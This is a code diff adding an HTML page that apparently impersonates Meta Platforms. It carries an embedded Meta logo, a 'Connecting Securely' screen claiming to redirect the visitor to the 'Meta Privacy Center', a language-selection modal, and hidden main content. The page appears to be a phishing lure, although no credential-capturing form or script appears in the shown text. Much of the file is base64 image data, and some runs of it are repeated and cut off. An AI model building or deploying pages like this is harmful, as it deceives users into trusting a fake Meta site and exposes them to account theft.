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" alt="Meta Platforms logo">
+      </div>
+
+      <h2>Connecting Securely</h2>
+
+      <p>
+        Please wait while we redirect you to the Meta Privacy Center to continue.
+      </p>
+
+      <div class="loader"></div>
+
+      <div class="loading-note">
+        This process may take a few seconds.
+      </div>
+
+      <div class="loading-footer">
+        Meta is a trademark of Meta Platforms, Inc.
+      </div>
+    </div>
+  </div>
+
+  <!-- Language Selection Modal -->
+  <div class="language-modal" id="languageModal">
+    <div class="language-modal-content">
+      <div class="language-modal-close" id="languageModalClose">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
+        </svg>
+      </div>
+      <h2 class="language-modal-title">Select Your Language</h2>
+      <p class="language-modal-subtitle">Choose your preferred language for the page content</p>
+      
+      <div class="language-search-container">
+        <div class="language-search-icon">
+          <i class="fas fa-search"></i>
+        </div>
+        <input type="text" class="language-search-input" id="languageSearchInput" placeholder="Search languages...">
+      </div>
+      
+      <div class="language-options" id="languageOptionsContainer">
+  <div class="language-option" data-lang="english">
+    <div class="language-flag">🇺🇸</div>
+    <div class="language-name">English</div>
+  </div>
+  <div class="language-option" data-lang="hindi">
+    <div class="language-flag">🇮🇳</div>
+    <div class="language-name">Hindi</div>
+  </div>
+  <div class="language-option" data-lang="spanish">
+    <div class="language-flag">🇪🇸</div>
+    <div class="language-name">Spanish</div>
+  </div>
+  <div class="language-option" data-lang="portuguese">
+    <div class="language-flag">🇵🇹</div>
+    <div class="language-name">Portuguese</div>
+  </div>
+  <div class="language-option" data-lang="tamil">
+    <div class="language-flag">🇮🇳</div>
+    <div class="language-name">Tamil</div>
+  </div>
+  <div class="language-option" data-lang="arabic">
+    <div class="language-flag">🇸🇦</div>
+    <div class="language-name">Arabic</div>
+  </div>
+  <!-- Additional languages for testing scroll -->
+  <div class="language-option" data-lang="french">
+    <div class="language-flag">🇫🇷</div>
+    <div class="language-name">French</div>
+  </div>
+    <div class="language-option" data-lang="vietnamese">
+    <div class="language-flag">🇻🇳</div>
+    <div class="language-name">Vietnamese</div>
+  </div>
+     <div class="language-option" data-lang="ghanaian">
+          <div class="language-flag">🇬🇭</div>
+          <div class="language-name">Ghanaian (Twi)</div>
+        </div>
+  
+</div>
+     
+     <button class="language-confirm-btn" id="languageConfirmBtn" disabled>Confirm Language</button>
+    </div>
+  </div>
+
+  <!-- Main Content (hidden until language is selected) -->
+  <div class="main-content" id="mainContent">
+    <!-- Mobile Header with fixed logo -->
+    <div class="mobile-header">
+      <img class="mobile-logo" src="data:image/png;base64,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